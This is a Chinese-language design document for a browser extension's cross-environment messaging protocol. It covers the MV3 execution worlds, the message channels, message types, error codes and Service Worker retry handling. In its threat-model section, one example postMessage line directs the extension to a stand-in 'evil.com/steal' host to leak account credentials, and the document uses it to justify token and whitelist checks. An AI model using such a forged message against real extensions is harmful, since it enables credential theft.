# 跨环境消息协议

> 状态：草案（v1 骨架阶段定稿）
> 代码真相源：`src/shared/types/messages.ts`
> 本文档为**解释性摘要**，字段以代码为准

---

## 为什么需要这份协议

MV3 的四个执行环境内存不共享：

| 环境 | 有 `chrome.*` | 有 DOM | 能看页面 JS 变量 |
| --- | --- | --- | --- |
| MAIN world | ❌ | ✅ | ✅ |
| ISOLATED world（content script） | ✅ | ✅ | ❌ |
| Service Worker | ✅ | ❌ | ❌ |
| Popup / Options | ✅ | ✅ | ❌ |

任何跨环境的数据传递都必须**显式定义成消息**。不许出现"我直接读一下那个变量"的写法。

---

## 三条通道

```
┌─────────────┐   channel A    ┌──────────────┐   channel B   ┌─────────────┐
│ MAIN world  │ ←postMessage→  │ ISOLATED     │ ←sendMessage→ │ Service     │
│ (net-hook)  │               │ (content)    │               │ Worker      │
└─────────────┘               └──────────────┘               └──────┬──────┘
                                                                    │
                                                             channel C
                                                                    │
                                                    ┌───────────────▼────┐
                                                    │ Popup / Options /  │
                                                    │ Login Window       │
                                                    └────────────────────┘
```

| 通道 | 机制 | 安全要点 |
| --- | --- | --- |
| A：MAIN ↔ ISOLATED | `window.postMessage` | **必须带随机 channelToken**，且 ISOLATED 侧二次校验 URL 白名单 |
| B：ISOLATED ↔ SW | `chrome.runtime.sendMessage` | 需处理 SW 休眠导致的连接失败，重试一次 |
| C：UI ↔ SW | `chrome.runtime.sendMessage` | 凭据永不下发给 UI，只下发"是否健康"之类的状态 |

---

## 通道 A：MAIN world ↔ ISOLATED world

### 为什么不能省掉 token

页面上的任意脚本都能监听 `window.message`。如果没有 token 校验，恶意脚本可以：

```js
window.postMessage({ __pluma: true, type: 'req', url: 'https://evil.com/steal' }, '*');
```

然后扩展就会**用播放账号的凭据**去请求攻击者的服务器——凭据直接泄露。

### 三层防护

1. **随机 token**：MAIN world 注入时生成 `crypto.randomUUID()`，只存在于闭包里，通过消息携带
2. **白名单复检**：ISOLATED world 收到消息后，**不信任何已校验的结论**，重新做一遍 host + pathname + method 校验
3. **方向限制**：只允许 `req`（MAIN→ISOLATED）和 `res`（ISOLATED→MAIN）两种类型，其他一律丢弃

### 消息形状

```js
// MAIN → ISOLATED
{
  __pluma: 1,            // 协议版本，不匹配直接丢弃
  token: "<uuid>",
  type: 'req',
  id: "<uuid>",          // 用于关联响应
  payload: {
    method: 'GET',
    url: 'https://api.bilibili.com/x/player/wbi/playurl?bvid=...',
    headers: { ... },
    body?: string,
  },
}

// ISOLATED → MAIN
{ __pluma: 1, type: 'res', id: "<同一个 id>", ok: true, status: 200, body: "..." }
{ __pluma: 1, type: 'res', id: "<同一个 id>", ok: false, error: 'not-in-whitelist' | 'http-403' | 'biz--412' | 'timeout' }
```

### 超时约定

MAIN world 发请求后 **8 秒**无响应即视为失败，走原始请求（回退主账号）。这个值要比 SW 侧的请求超时短，保证用户不会看到空白播放器。

> ⚠️ **`req` / `res` 是早期草案，从未实现。** 实际方案是 DNR 在网络层换 Cookie，
> 不需要把请求代理回扩展（见 [ADR 0010](../decisions/0010-page-proxy-via-tab-ids.md)）。
> 现行消息全部是**单向上报**（MAIN → ISOLATED），没有请求-应答。
> 完整清单看 `entrypoints/content.ts` 的 `listenMainWorld()`，本文件只记新增的与容易误解的。

### 现行消息里两个容易搞混的（2026-10-26 新增）

都用于「主账号基线」（[ADR 0014](../decisions/0014-quality-compare-from-page-data.md)）：

| type | 载荷 | 语义 |
| --- | --- | --- |
| `ssr-playinfo` | `{ firstSeen: 'initial'\|'set'\|'none', playurlBefore: boolean, data, user }` | 冻结的第一份 `__playinfo__` + 主账号 `uname`/`face` |
| `playurl-raw` | `{ json }` | 页面自己那次 playurl 响应的**原文**（播放账号身份），只报一次 |

**为什么两个都要带"时机"而不是只带数据**：

`__playinfo__` 有两份说法互相矛盾（SSR vs 客户端写入）。如果它是页面**发完 playurl 之后**才写的，
那份数据来自**已被代理**的请求 = 播放账号身份。拿它当主账号基线，画质对比会永远显示"没有提升"，
且不报错、不崩溃。所以判据是 `firstSeen` + `playurlBefore`，判定在
`src/content/isolated/page-state.ts`（纯函数，有单测）。

`ssr-playinfo` 会被上报多次（hello / ready / 延迟补报）—— `__playinfo__` 与 `__INITIAL_STATE__`
谁先就绪不确定。合并规则：能力只接受可用基线且不被后到的坏消息抹掉，`user` 后到覆盖先到。

---

## 通道 D：ISOLATED ↔ 扩展页面（popup / 诊断页）

**新增于 2026-10-26。** 与通道 B/C 不同，这条**不经 Service Worker**。

```
扩展页面 --chrome.tabs.sendMessage(tabId, {type:'page/summary:get'})--> content
扩展页面 <--{type:'page/summary:ok', view: PageTracksView}---------------
```

| 为什么直连 | 说明 |
| --- | --- |
| 数据只对"当前这个标签页"有意义 | content 本来就在那个页面里，绕 SW 只是多一份要维护的缓存 |
| 不存在缓存过期 | 每次都拿到最新值，不会出现"popup 显示上一页数据" |
| 代价 | 目标标签页没有 content script 时 `sendMessage` **抛异常**（不是返回空），调用方必须 catch |

类型在 `src/shared/types/messages.ts` 的 `PageQueryMsg` / `PageQueryReply`。

---

## 通道 B：ISOLATED ↔ Service Worker

### 消息类型清单

> ⚠️ 下表是**当前实现**的清单（2026-10-25 P2-a 后）。更早的草案里
> `bridge/ping` / `playinfo/proxy` / `diagnose/*` 等名称**已不采用**——实际方案是 DNR 换 Cookie，
> 不需要把请求代理回 SW。以 `src/shared/types/messages.ts` 为准。

| type | 方向 | payload | 说明 |
| --- | --- | --- | --- |
| `account/summary` | UI→SW | `{ recheck?: boolean }` | 账号摘要 + 健康。`recheck` 省略时按 6h 窗口惰性判断 |
| `account/remove` | UI→SW | — | 退出播放账号：清凭据/规则/健康/统计/摘要 |
| `qr/generate` | UI→SW | — | 生成二维码 |
| `qr/poll` | UI→SW | `{ qrcodeKey }` | 轮询扫码状态 |
| `login/open` | UI→SW | — | 打开隔离窗口登录 |
| `playinfo/get` | —（未使用） | `{ bvid, cid, qn }` | **已定义但无人收发**。预留给 P3 的取流/体检，`qn` 为 `null` 表示自动取最高 |
| `proxy/status` | UI→SW | — | 总开关状态（只读） |
| `proxy/set` | UI→SW | `{ enabled }` | 切换总开关 |
| `proxy/affected-tabs` | UI→SW | — | 已打开的视频页里还有几个是旧画质（→ `{ count, tabIds }`） |
| `tabs/reload` | UI→SW | `{ tabIds }` | 刷新指定标签页（用户点"全部刷新"） |
| `stats/recent` | UI→SW | — | 最近 1 小时成功率时序（12 桶） |
| `page/activate` | content→SW | `{ bvid, p, deviceCookies, primaryMid }` | 视频页报到，装 tab 规则 |
| `page/quality` | content→SW | `{ height, note? }` | 诊断日志 |

### 统一响应包装

```ts
type Reply<T> =
  | { ok: true; data: T }
  | { ok: false; code: ErrCode; message?: string };
```

**错误码必须枚举**，不许直接返回字符串。因为 UI 要按错误码决定显示哪个状态（见 `docs/02-ui-spec.md` 的七种状态）。

```ts
enum ErrCode {
  NO_PLAYBACK_ACCOUNT = 'no-playback-account',
  CREDENTIAL_EXPIRED = 'credential-expired',
  DNR_RULE_EXHAUSTED = 'dnr-rule-exhausted',
  BIZ_ERROR = 'biz-error',        // 带 detail: -412 / -101 / -404 ...
  NETWORK = 'network',
  TIMEOUT = 'timeout',
  NOT_IN_WHITELIST = 'not-in-whitelist',
}
```

> ⚠️ **错误码是 UI 与业务的契约。** 新增一种失败原因时，先加错误码，再改 UI，再改实现。反过来做会导致 UI 出现"未知错误"这种无信息量的提示。

### SW 休眠的处理

MV3 的 SW 在 30 秒无事件后休眠。`sendMessage` 可能抛：

```
Could not establish connection. Receiving end does not exist.
```

**统一封装在 `platform/runtime/messaging.ts`**：

```ts
async function send<T>(msg: Msg): Promise<Reply<T>> {
  try {
    return await chrome.runtime.sendMessage(msg);
  } catch (e) {
    if (isSwWaking(e)) {
      await sleep(120);          // 给 SW 一点启动时间
      return await chrome.runtime.sendMessage(msg);   // 只重试一次
    }
    throw e;
  }
}
```

**只重试一次。** 重试多次会掩盖真正的 bug（比如 handler 没注册）。

---

## 通道 C：UI ↔ Service Worker

UI 有三个入口：popup、options、login window。

### 关键约束

1. **凭据永不下发给 UI。** UI 只能拿到 `{ uname, mid, vipLabel, expireAt, healthy }`，拿不到 `sessdata`。
2. **popup 失焦即销毁。** 任何"等用户操作"的长流程都不能在 popup 里跑（见 `docs/02-ui-spec.md` §1）。
3. **扫码走独立窗口。** popup 点"扫码登录"后，由 SW 或 popup 调 `chrome.windows.create({ type: 'popup' })` 开一个 420×560 的窗口。窗口关闭时通知 SW 清理扫码会话。

### 状态推送 vs 轮询

popup 存活时间很短，用**拉取**（打开时查一次）比**推送**简单可靠。

```
popup 打开 → send({ type: 'account/summary' }) → 渲染对应状态
（不需要 SW 主动 push，因为 popup 生命周期太短，push 没有意义）
```

> ⚠️ **options 页的推送机制尚未实现**（options 页本身是 P3）。
> 计划是：用户可能停留很久，状态要实时更新，届时由 SW 广播一条新的消息类型，options 页监听。
> **不要照抄成"已有 `account/health` 广播"**——该消息类型在 `messages.ts` 里不存在，
> 当前只有拉取式的 `account/summary`。

---

## 协议演进规则

1. **协议版本号 `__pluma: 1` 必须随不兼容改动递增。** 收到不匹配的版本直接丢弃消息，不做兼容转换。
2. **新增字段必须可选**，老版本收到不认识的字段应忽略而非报错。
3. **删除字段必须先标记 deprecated 一个版本**，再删。
4. **`shared/types/messages.ts` 是唯一真相源**，本文档从代码抄，不要反向维护。

---

## 相关代码位置

> 下表是**实际实现位置**。原规划里的 `src/content/main-world/channel.ts`、
> `src/content/isolated/router.ts`、`src/background/index.ts`、
> `src/platform/runtime/messaging.ts` **均未按此落地**——WXT 约定下入口在 `entrypoints/`，
> 见 [ADR 0005](../decisions/0005-adopt-wxt-conventions.md)。

| 概念 | 文件 |
| --- | --- |
| 消息类型定义 | `src/shared/types/messages.ts` |
| 错误码 | `src/shared/types/errors.ts` |
| MAIN world 脚本（整份，含通道） | `public/main-world.js` |
| ISOLATED 侧编排 + 通道令牌 | `entrypoints/content.ts` |
| SW 入口 + 消息分发 | `entrypoints/background.ts` |
| 各消息处理函数 | `src/background/handlers/*.handler.ts` |
| UI 侧调用 | 直接在页面里 `chrome.runtime.sendMessage`（无独立封装层） |
